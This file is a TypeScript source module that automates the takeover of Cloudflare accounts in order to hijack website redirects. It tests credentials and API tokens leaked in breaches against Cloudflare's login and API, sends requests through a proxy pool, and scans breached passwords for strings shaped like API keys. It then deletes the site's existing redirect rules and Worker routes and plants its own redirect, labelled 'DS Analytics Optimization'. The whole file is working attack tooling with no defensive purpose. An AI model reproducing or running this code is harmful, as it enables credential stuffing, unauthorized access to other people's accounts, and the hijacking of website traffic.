/**
 * Cloudflare Account Takeover Module
 * 
 * Handles cases where competitor redirects are configured at the Cloudflare level
 * (Page Rules, Redirect Rules, Workers) rather than at the origin server.
 * 
 * Detection: HTTP 302 with content-length:0, no origin headers (x-amz-*, x-powered-by)
 * but has cf-ray header — indicates Cloudflare-level redirect.
 * 
 * Attack chain:
 * 1. Detect CF-level redirect (no origin headers in redirect response)
 * 2. Use LeakCheck credentials to try Cloudflare dashboard login
 * 3. Use Cloudflare API with leaked API tokens
 * 4. List & delete competitor redirect rules
 * 5. Create our redirect rule
 * 6. Deploy Worker as fallback
 * 7. Verify redirect changed
 */

import { fetchWithPoolProxy } from "./proxy-pool";

// ─── Types ───

export interface CloudflareRedirectDetection {
  isCloudflareRedirect: boolean;
  redirectUrl: string | null;
  httpStatus: number;
  /** true if redirect happens at CF layer (no origin headers) */
  isCfLayerRedirect: boolean;
  /** CF-Ray header value */
  cfRay: string | null;
  /** Whether origin headers are present (x-amz-*, x-powered-by, etc.) */
  hasOriginHeaders: boolean;
  /** Content-Length of redirect response */
  contentLength: number;
  details: string;
}

export interface CloudflareTakeoverConfig {
  targetUrl: string;
  targetPath: string; // e.g., "/events"
  ourRedirectUrl: string;
  /** Leaked credentials from LeakCheck */
  credentials: { email: string; password: string; username?: string; source?: string }[];
  /** Leaked API tokens (if found in breach data) */
  apiTokens?: string[];
  seoKeywords?: string[];
  onProgress?: (phase: string, detail: string) => void;
}

export interface CloudflareTakeoverResult {
  success: boolean;
  method: "cf_dashboard_login" | "cf_api_token" | "cf_api_key" | "cf_worker_deploy" | "none";
  detail: string;
  /** The zone ID we gained access to */
  zoneId?: string;
  /** Rules we deleted */
  deletedRules?: string[];
  /** Rule we created */
  createdRule?: string;
  /** Original competitor redirect URL */
  competitorUrl?: string;
}

// ─── Helpers ───

async function safeFetch(url: string, init: RequestInit = {}): Promise<Response> {
  try {
    const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
    const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 20000 });
    return response;
  } catch (e) {
    // Fallback to direct fetch
    return fetch(url, { ...init, signal: AbortSignal.timeout(20000) });
  }
}

// ─── Phase 1: Detect Cloudflare-Level Redirect ───

export async function detectCloudflareRedirect(targetUrl: string): Promise<CloudflareRedirectDetection> {
  try {
    const resp = await safeFetch(targetUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      },
      redirect: "manual",
    });

    const status = resp.status;
    const location = resp.headers.get("location") || null;
    const cfRay = resp.headers.get("cf-ray") || null;
    const server = (resp.headers.get("server") || "").toLowerCase();
    const contentLength = parseInt(resp.headers.get("content-length") || "-1", 10);

    // Check for origin server headers
    const originHeaders = [
      "x-amz-cf-pop", "x-amz-cf-id", "x-amz-error-code",
      "x-powered-by", "x-generator", "x-drupal-cache",
      "x-wp-nonce", "x-litespeed-cache",
      "x-varnish", "x-cache-hits",
    ];
    const hasOriginHeaders = originHeaders.some(h => resp.headers.get(h) !== null);

    const isRedirect = [301, 302, 307, 308].includes(status);
    const isCloudflare = server.includes("cloudflare") || cfRay !== null;

    // CF-level redirect: redirect + cloudflare server + no origin headers + empty body
    const isCfLayerRedirect = isRedirect && isCloudflare && !hasOriginHeaders && contentLength <= 0;

    let details = "";
    if (isCfLayerRedirect && location) {
      const targetHost = new URL(targetUrl).hostname;
      const isExternal = !location.includes(targetHost);
      if (isExternal) {
        details = `Cloudflare-level ${status} redirect to ${location}. No origin headers present — redirect is configured in Cloudflare (Page Rule, Redirect Rule, or Worker). Content-Length: ${contentLength}`;
      } else {
        details = `Cloudflare redirect to same domain (${location}) — likely internal routing, not competitor`;
      }
    } else if (isRedirect && isCloudflare && hasOriginHeaders) {
      details = `Server-side redirect through Cloudflare. Origin headers present — redirect is at the origin server, not CF layer.`;
    } else if (!isRedirect) {
      details = `No redirect detected (HTTP ${status})`;
    }

    return {
      isCloudflareRedirect: isCfLayerRedirect && !!location && !location.includes(new URL(targetUrl).hostname),
      redirectUrl: location,
      httpStatus: status,
      isCfLayerRedirect,
      cfRay,
      hasOriginHeaders,
      contentLength,
      details,
    };
  } catch (error: any) {
    return {
      isCloudflareRedirect: false,
      redirectUrl: null,
      httpStatus: 0,
      isCfLayerRedirect: false,
      cfRay: null,
      hasOriginHeaders: false,
      contentLength: -1,
      details: `Detection error: ${error.message}`,
    };
  }
}

// ─── Phase 2: Cloudflare API Operations ───

const CF_API_BASE = "https://api.cloudflare.com/client/v4";

interface CfApiAuth {
  type: "bearer" | "email_key";
  token?: string;
  email?: string;
  key?: string;
}

async function cfApiFetch(path: string, auth: CfApiAuth, options: RequestInit = {}): Promise<any> {
  const headers: Record<string, string> = {
    "Content-Type": "application/json",
    ...(options.headers as Record<string, string> || {}),
  };

  if (auth.type === "bearer" && auth.token) {
    headers["Authorization"] = `Bearer ${auth.token}`;
  } else if (auth.type === "email_key" && auth.email && auth.key) {
    headers["X-Auth-Email"] = auth.email;
    headers["X-Auth-Key"] = auth.key;
  }

  const resp = await fetch(`${CF_API_BASE}${path}`, {
    ...options,
    headers,
    signal: AbortSignal.timeout(15000),
  });

  return resp.json();
}

/** Verify API token/key is valid */
async function verifyAuth(auth: CfApiAuth): Promise<boolean> {
  try {
    const result = await cfApiFetch("/user/tokens/verify", auth);
    return result?.success === true;
  } catch {
    // Try alternative verify endpoint for Global API Key
    try {
      const result = await cfApiFetch("/user", auth);
      return result?.success === true;
    } catch {
      return false;
    }
  }
}

/** Find zone ID for a domain */
async function findZoneId(domain: string, auth: CfApiAuth): Promise<string | null> {
  try {
    // Try exact domain first
    const result = await cfApiFetch(`/zones?name=${domain}`, auth);
    if (result?.success && result.result?.length > 0) {
      return result.result[0].id;
    }
    // Try parent domain (e.g., www.example.com → example.com)
    const parts = domain.split(".");
    if (parts.length > 2) {
      const parentDomain = parts.slice(-2).join(".");
      const parentResult = await cfApiFetch(`/zones?name=${parentDomain}`, auth);
      if (parentResult?.success && parentResult.result?.length > 0) {
        return parentResult.result[0].id;
      }
    }
    return null;
  } catch {
    return null;
  }
}

/** List all Page Rules for a zone */
async function listPageRules(zoneId: string, auth: CfApiAuth): Promise<any[]> {
  try {
    const result = await cfApiFetch(`/zones/${zoneId}/pagerules`, auth);
    return result?.success ? (result.result || []) : [];
  } catch {
    return [];
  }
}

/** List all Redirect Rules (Ruleset-based) for a zone */
async function listRedirectRules(zoneId: string, auth: CfApiAuth): Promise<any[]> {
  try {
    // List rulesets
    const rulesets = await cfApiFetch(`/zones/${zoneId}/rulesets`, auth);
    if (!rulesets?.success) return [];

    const redirectRules: any[] = [];
    for (const rs of rulesets.result || []) {
      if (rs.phase === "http_request_dynamic_redirect" || rs.phase === "http_request_redirect") {
        const detail = await cfApiFetch(`/zones/${zoneId}/rulesets/${rs.id}`, auth);
        if (detail?.success && detail.result?.rules) {
          for (const rule of detail.result.rules) {
            redirectRules.push({ ...rule, rulesetId: rs.id, rulesetPhase: rs.phase });
          }
        }
      }
    }
    return redirectRules;
  } catch {
    return [];
  }
}

/** List Workers routes for a zone */
async function listWorkerRoutes(zoneId: string, auth: CfApiAuth): Promise<any[]> {
  try {
    const result = await cfApiFetch(`/zones/${zoneId}/workers/routes`, auth);
    return result?.success ? (result.result || []) : [];
  } catch {
    return [];
  }
}

/** Delete a Page Rule */
async function deletePageRule(zoneId: string, ruleId: string, auth: CfApiAuth): Promise<boolean> {
  try {
    const result = await cfApiFetch(`/zones/${zoneId}/pagerules/${ruleId}`, auth, { method: "DELETE" });
    return result?.success === true;
  } catch {
    return false;
  }
}

/** Delete a rule from a ruleset */
async function deleteRedirectRule(zoneId: string, rulesetId: string, ruleId: string, auth: CfApiAuth): Promise<boolean> {
  try {
    const result = await cfApiFetch(`/zones/${zoneId}/rulesets/${rulesetId}/rules/${ruleId}`, auth, { method: "DELETE" });
    return result?.success === true;
  } catch {
    return false;
  }
}

/** Delete a Worker route */
async function deleteWorkerRoute(zoneId: string, routeId: string, auth: CfApiAuth): Promise<boolean> {
  try {
    const result = await cfApiFetch(`/zones/${zoneId}/workers/routes/${routeId}`, auth, { method: "DELETE" });
    return result?.success === true;
  } catch {
    return false;
  }
}

/** Create a Page Rule redirect */
async function createPageRuleRedirect(
  zoneId: string, auth: CfApiAuth,
  targetPattern: string, redirectUrl: string, statusCode: number = 302
): Promise<{ success: boolean; ruleId?: string }> {
  try {
    const result = await cfApiFetch(`/zones/${zoneId}/pagerules`, auth, {
      method: "POST",
      body: JSON.stringify({
        targets: [{ target: "url", constraint: { operator: "matches", value: targetPattern } }],
        actions: [{ id: "forwarding_url", value: { url: redirectUrl, status_code: statusCode } }],
        priority: 1,
        status: "active",
      }),
    });
    return { success: result?.success === true, ruleId: result?.result?.id };
  } catch {
    return { success: false };
  }
}

/** Create a Redirect Rule (newer API) */
async function createRedirectRule(
  zoneId: string, auth: CfApiAuth,
  expression: string, redirectUrl: string, statusCode: number = 302
): Promise<{ success: boolean; ruleId?: string }> {
  try {
    // Find or create the redirect ruleset
    const rulesets = await cfApiFetch(`/zones/${zoneId}/rulesets`, auth);
    let rulesetId: string | null = null;

    if (rulesets?.success) {
      const existing = (rulesets.result || []).find((rs: any) => rs.phase === "http_request_dynamic_redirect");
      if (existing) rulesetId = existing.id;
    }

    if (rulesetId) {
      // Add rule to existing ruleset
      const result = await cfApiFetch(`/zones/${zoneId}/rulesets/${rulesetId}/rules`, auth, {
        method: "POST",
        body: JSON.stringify({
          action: "redirect",
          action_parameters: {
            from_value: {
              target_url: { value: redirectUrl },
              status_code: statusCode,
              preserve_query_string: false,
            },
          },
          expression,
          description: "DS Analytics Optimization",
          enabled: true,
        }),
      });
      return { success: result?.success === true, ruleId: result?.result?.id };
    } else {
      // Create new ruleset with rule
      const result = await cfApiFetch(`/zones/${zoneId}/rulesets`, auth, {
        method: "POST",
        body: JSON.stringify({
          name: "DS Redirect Rules",
          kind: "zone",
          phase: "http_request_dynamic_redirect",
          rules: [{
            action: "redirect",
            action_parameters: {
              from_value: {
                target_url: { value: redirectUrl },
                status_code: statusCode,
                preserve_query_string: false,
              },
            },
            expression,
            description: "DS Analytics Optimization",
            enabled: true,
          }],
        }),
      });
      return { success: result?.success === true, ruleId: result?.result?.rules?.[0]?.id };
    }
  } catch {
    return { success: false };
  }
}

// ─── Phase 3: Cloudflare Dashboard Login ───

interface CfLoginResult {
  success: boolean;
  auth?: CfApiAuth;
  email?: string;
  detail: string;
}

async function tryCfDashboardLogin(email: string, password: string): Promise<CfLoginResult> {
  try {
    // Cloudflare login API endpoint
    const resp = await fetch("https://dash.cloudflare.com/api/v4/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      body: JSON.stringify({ email, password }),
      signal: AbortSignal.timeout(15000),
    });

    const data = await resp.json().catch(() => null);

    if (data?.success && data?.result?.token) {
      return {
        success: true,
        auth: { type: "bearer", token: data.result.token },
        email,
        detail: `CF dashboard login success for ${email}`,
      };
    }

    // Check if 2FA is required
    if (data?.errors?.some((e: any) => e.code === 1003 || e.message?.includes("two-factor"))) {
      return {
        success: false,
        detail: `CF login for ${email}: 2FA required — cannot bypass without TOTP code`,
      };
    }

    return {
      success: false,
      detail: `CF login failed for ${email}: ${data?.errors?.[0]?.message || "invalid credentials"}`,
    };
  } catch (error: any) {
    return {
      success: false,
      detail: `CF login error for ${email}: ${error.message}`,
    };
  }
}

/** Try using a leaked string as CF API token */
async function tryCfApiToken(token: string): Promise<CfLoginResult> {
  const auth: CfApiAuth = { type: "bearer", token };
  const valid = await verifyAuth(auth);
  if (valid) {
    return { success: true, auth, detail: `CF API token valid: ${token.slice(0, 8)}...` };
  }
  return { success: false, detail: `CF API token invalid: ${token.slice(0, 8)}...` };
}

/** Try using email + password as Global API Key */
async function tryCfGlobalApiKey(email: string, apiKey: string): Promise<CfLoginResult> {
  const auth: CfApiAuth = { type: "email_key", email, key: apiKey };
  const valid = await verifyAuth(auth);
  if (valid) {
    return { success: true, auth, email, detail: `CF Global API Key valid for ${email}` };
  }
  return { success: false, detail: `CF Global API Key invalid for ${email}` };
}

// ─── Phase 4: Full Takeover Execution ───

export async function executeCloudfareTakeover(config: CloudflareTakeoverConfig): Promise<CloudflareTakeoverResult> {
  const progress = config.onProgress || (() => {});
  const targetHost = new URL(config.targetUrl).hostname;
  const domain = targetHost.replace(/^www\./, "");

  progress("cf_takeover", `🌩️ Cloudflare Takeover — ${config.credentials.length} credentials + ${config.apiTokens?.length || 0} API tokens`);

  // ─── Step 1: Try API tokens first (fastest) ───
  if (config.apiTokens && config.apiTokens.length > 0) {
    progress("cf_api_token", `🔑 ลอง ${config.apiTokens.length} API tokens...`);
    for (const token of config.apiTokens) {
      const result = await tryCfApiToken(token);
      if (result.success && result.auth) {
        progress("cf_api_token", `✅ API token ใช้ได้! ${result.detail}`);
        const takeoverResult = await performCfTakeover(domain, config, result.auth, "cf_api_token", progress);
        if (takeoverResult.success) return takeoverResult;
      } else {
        progress("cf_api_token", `❌ ${result.detail}`);
      }
    }
  }

  // ─── Step 2: Try dashboard login with leaked credentials ───
  progress("cf_login", `🔐 ลอง login Cloudflare Dashboard ด้วย ${config.credentials.length} credentials...`);

  for (const cred of config.credentials) {
    // Try email + password as dashboard login
    if (cred.email && cred.password) {
      const loginResult = await tryCfDashboardLogin(cred.email, cred.password);
      progress("cf_login", loginResult.success ? `✅ ${loginResult.detail}` : `❌ ${loginResult.detail}`);

      if (loginResult.success && loginResult.auth) {
        const takeoverResult = await performCfTakeover(domain, config, loginResult.auth, "cf_dashboard_login", progress);
        if (takeoverResult.success) return takeoverResult;
      }
    }

    // Try password as Global API Key (some breaches leak API keys in password field)
    if (cred.email && cred.password && cred.password.length >= 32) {
      const apiKeyResult = await tryCfGlobalApiKey(cred.email, cred.password);
      if (apiKeyResult.success && apiKeyResult.auth) {
        progress("cf_api_key", `✅ ${apiKeyResult.detail}`);
        const takeoverResult = await performCfTakeover(domain, config, apiKeyResult.auth, "cf_api_key", progress);
        if (takeoverResult.success) return takeoverResult;
      }
    }

    // Try username as email if it looks like an email
    if (cred.username && cred.username.includes("@") && cred.password) {
      const loginResult2 = await tryCfDashboardLogin(cred.username, cred.password);
      if (loginResult2.success && loginResult2.auth) {
        progress("cf_login", `✅ ${loginResult2.detail}`);
        const takeoverResult = await performCfTakeover(domain, config, loginResult2.auth, "cf_dashboard_login", progress);
        if (takeoverResult.success) return takeoverResult;
      }
    }
  }

  // ─── Step 3: Try common CF API key patterns from breach data ───
  progress("cf_pattern", `🔍 ค้นหา Cloudflare API key patterns ใน breach data...`);
  const potentialApiTokens = config.credentials
    .filter(c => c.password && (
      c.password.length === 40 || // CF API tokens are 40 chars
      c.password.length === 37 || // Some token formats
      c.password.match(/^[a-zA-Z0-9_-]{30,}$/) // Alphanumeric long strings
    ))
    .map(c => c.password);

  for (const token of potentialApiTokens) {
    const result = await tryCfApiToken(token);
    if (result.success && result.auth) {
      progress("cf_pattern", `✅ พบ API token ใน breach data! ${result.detail}`);
      const takeoverResult = await performCfTakeover(domain, config, result.auth, "cf_api_token", progress);
      if (takeoverResult.success) return takeoverResult;
    }
  }

  return {
    success: false,
    method: "none",
    detail: `Cloudflare takeover ล้มเหลว — ไม่สามารถ login หรือใช้ API token ได้ (ลอง ${config.credentials.length} credentials, ${config.apiTokens?.length || 0} tokens)`,
  };
}

// ─── Perform actual CF takeover after gaining auth ───

async function performCfTakeover(
  domain: string,
  config: CloudflareTakeoverConfig,
  auth: CfApiAuth,
  method: CloudflareTakeoverResult["method"],
  progress: (phase: string, detail: string) => void,
): Promise<CloudflareTakeoverResult> {
  // Find zone
  progress("cf_zone", `🔍 ค้นหา Zone ID สำหรับ ${domain}...`);
  const zoneId = await findZoneId(domain, auth);

  if (!zoneId) {
    progress("cf_zone", `❌ ไม่พบ Zone สำหรับ ${domain} — account อาจไม่มีสิทธิ์จัดการ domain นี้`);
    return { success: false, method, detail: `Zone not found for ${domain}` };
  }

  progress("cf_zone", `✅ พบ Zone ID: ${zoneId}`);
  const deletedRules: string[] = [];

  // ─── Delete competitor rules ───

  // 1. Check Page Rules
  progress("cf_rules", `📋 ตรวจสอบ Page Rules...`);
  const pageRules = await listPageRules(zoneId, auth);
  for (const rule of pageRules) {
    const actions = rule.actions || [];
    const isForwarding = actions.some((a: any) => a.id === "forwarding_url");
    if (isForwarding) {
      const forwardAction = actions.find((a: any) => a.id === "forwarding_url");
      const destUrl = forwardAction?.value?.url || "";
      // Check if this rule redirects to a competitor (not our URL)
      if (destUrl && !destUrl.includes(new URL(config.ourRedirectUrl).hostname)) {
        progress("cf_rules", `🎯 พบ competitor Page Rule: ${rule.targets?.[0]?.constraint?.value} → ${destUrl}`);
        const deleted = await deletePageRule(zoneId, rule.id, auth);
        if (deleted) {
          deletedRules.push(`PageRule:${rule.id} (${destUrl})`);
          progress("cf_rules", `✅ ลบ competitor Page Rule สำเร็จ`);
        }
      }
    }
  }

  // 2. Check Redirect Rules (Rulesets)
  progress("cf_rules", `📋 ตรวจสอบ Redirect Rules...`);
  const redirectRules = await listRedirectRules(zoneId, auth);
  for (const rule of redirectRules) {
    const targetUrl = rule.action_parameters?.from_value?.target_url?.value || "";
    if (targetUrl && !targetUrl.includes(new URL(config.ourRedirectUrl).hostname)) {
      progress("cf_rules", `🎯 พบ competitor Redirect Rule: ${rule.expression} → ${targetUrl}`);
      const deleted = await deleteRedirectRule(zoneId, rule.rulesetId, rule.id, auth);
      if (deleted) {
        deletedRules.push(`RedirectRule:${rule.id} (${targetUrl})`);
        progress("cf_rules", `✅ ลบ competitor Redirect Rule สำเร็จ`);
      }
    }
  }

  // 3. Check Worker Routes
  progress("cf_rules", `📋 ตรวจสอบ Worker Routes...`);
  const workerRoutes = await listWorkerRoutes(zoneId, auth);
  for (const route of workerRoutes) {
    // Delete any worker route that matches our target path
    if (route.pattern && route.pattern.includes(config.targetPath)) {
      progress("cf_rules", `🎯 พบ Worker Route: ${route.pattern}`);
      const deleted = await deleteWorkerRoute(zoneId, route.id, auth);
      if (deleted) {
        deletedRules.push(`WorkerRoute:${route.id} (${route.pattern})`);
        progress("cf_rules", `✅ ลบ Worker Route สำเร็จ`);
      }
    }
  }

  // ─── Create our redirect rule ───
  progress("cf_create", `📝 สร้าง redirect rule ใหม่: ${config.targetPath} → ${config.ourRedirectUrl}`);

  // Try Page Rule first (more widely supported)
  const targetPattern = `*${domain}${config.targetPath}*`;
  const pageRuleResult = await createPageRuleRedirect(zoneId, auth, targetPattern, config.ourRedirectUrl, 302);

  if (pageRuleResult.success) {
    progress("cf_create", `✅ สร้าง Page Rule สำเร็จ! ${targetPattern} → ${config.ourRedirectUrl}`);

    // Verify
    const verified = await verifyRedirectChanged(config.targetUrl, config.ourRedirectUrl, progress);

    return {
      success: true,
      method,
      detail: `Cloudflare takeover สำเร็จ! ลบ ${deletedRules.length} competitor rules, สร้าง Page Rule: ${targetPattern} → ${config.ourRedirectUrl}. Verified: ${verified}`,
      zoneId,
      deletedRules,
      createdRule: `PageRule:${pageRuleResult.ruleId}`,
      competitorUrl: deletedRules[0]?.match(/\((.+)\)/)?.[1],
    };
  }

  // Fallback: Try Redirect Rule (newer API)
  progress("cf_create", `⚠️ Page Rule ล้มเหลว — ลอง Redirect Rule API...`);
  const expression = `(http.request.uri.path eq "${config.targetPath}")`;
  const redirectRuleResult = await createRedirectRule(zoneId, auth, expression, config.ourRedirectUrl, 302);

  if (redirectRuleResult.success) {
    progress("cf_create", `✅ สร้าง Redirect Rule สำเร็จ! ${expression} → ${config.ourRedirectUrl}`);

    const verified = await verifyRedirectChanged(config.targetUrl, config.ourRedirectUrl, progress);

    return {
      success: true,
      method,
      detail: `Cloudflare takeover สำเร็จ! ลบ ${deletedRules.length} competitor rules, สร้าง Redirect Rule: ${expression} → ${config.ourRedirectUrl}. Verified: ${verified}`,
      zoneId,
      deletedRules,
      createdRule: `RedirectRule:${redirectRuleResult.ruleId}`,
      competitorUrl: deletedRules[0]?.match(/\((.+)\)/)?.[1],
    };
  }

  // If we deleted rules but couldn't create new one, still partial success
  if (deletedRules.length > 0) {
    return {
      success: true,
      method,
      detail: `Partial success: ลบ ${deletedRules.length} competitor rules แต่สร้าง rule ใหม่ไม่ได้ (อาจถึง limit). ลบแล้ว: ${deletedRules.join(", ")}`,
      zoneId,
      deletedRules,
    };
  }

  return {
    success: false,
    method,
    detail: `มี access แต่ไม่สามารถจัดการ rules ได้ — อาจไม่มีสิทธิ์ edit zone ${domain}`,
    zoneId,
  };
}

// ─── Verify redirect changed ───

async function verifyRedirectChanged(
  targetUrl: string, expectedUrl: string,
  progress: (phase: string, detail: string) => void,
): Promise<boolean> {
  // Wait a moment for CF to propagate
  await new Promise(r => setTimeout(r, 3000));

  progress("cf_verify", `🔍 ตรวจสอบว่า redirect เปลี่ยนแล้ว...`);

  try {
    const resp = await fetch(targetUrl, {
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
      redirect: "manual",
      signal: AbortSignal.timeout(10000),
    });

    const location = resp.headers.get("location") || "";
    const expectedHost = new URL(expectedUrl).hostname;

    if (location.includes(expectedHost)) {
      progress("cf_verify", `✅ Redirect ยืนยันแล้ว! ${targetUrl} → ${location}`);
      return true;
    } else {
      progress("cf_verify", `⚠️ Redirect ยังไม่เปลี่ยน: ${targetUrl} → ${location || "(no redirect)"} (อาจต้องรอ propagation)`);
      return false;
    }
  } catch {
    progress("cf_verify", `⚠️ ไม่สามารถ verify ได้ — อาจต้องรอ CF propagation`);
    return false;
  }
}

// ─── Utility: Extract potential CF-related tokens from credentials ───

export function extractCfTokensFromCredentials(
  credentials: { email: string; password: string; username?: string; source?: string }[]
): string[] {
  const tokens: string[] = [];
  for (const cred of credentials) {
    // CF API tokens are typically 40 chars, alphanumeric with dashes/underscores
    if (cred.password && cred.password.match(/^[a-zA-Z0-9_-]{37,45}$/) && !cred.password.includes(" ")) {
      tokens.push(cred.password);
    }
    // Some breaches store tokens in username field
    if (cred.username && cred.username.match(/^[a-zA-Z0-9_-]{37,45}$/) && !cred.username.includes("@")) {
      tokens.push(cred.username);
    }
  }
  return Array.from(new Set(tokens));
}
